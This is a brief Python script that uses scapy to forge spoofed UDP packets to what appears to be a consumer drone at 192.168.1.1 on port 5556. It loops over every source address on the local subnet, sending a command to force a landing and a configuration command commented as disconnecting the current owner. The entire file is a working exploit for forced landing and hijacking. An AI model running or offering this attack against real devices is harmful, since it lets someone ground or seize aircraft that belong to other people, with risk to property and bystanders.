#! /usr/bin/env python

# based off subverter.py

import os, sys
from scapy.all import *

def isRoot():
    """Verifies if the current user is root"""
    return os.getuid() & os.getgid() == 0

if __name__ == "__main__":

    if not isRoot():
        print "[-] Your have to be root to use scapy"
        sys.exit(0)

    # try packet forging attack
    try:
        while(True):
            land_cmd = "AT*REF=%d,0\r" % 1 # seqno 1 is always accepted
            disconnect_cmd = 'AT*CONFIG=1,"network:owner_mac","00:00:00:00:00:00"' # disconnects current owner

            for i in xrange(256): # 8 bits in last field
                real_ip = '192.168.1.' + str(i)
                land_pkt = IP(src=real_ip, dst='192.168.1.1')/UDP(dport=5556)/land_cmd
                disconnect_pkt = IP(src=real_ip, dst='192.168.1.1')/UDP(dport=5556)/disconnect_cmd
                send(land_pkt)
                send(disconnect_pkt)

    except KeyboardInterrupt:
        sys.exit(0)






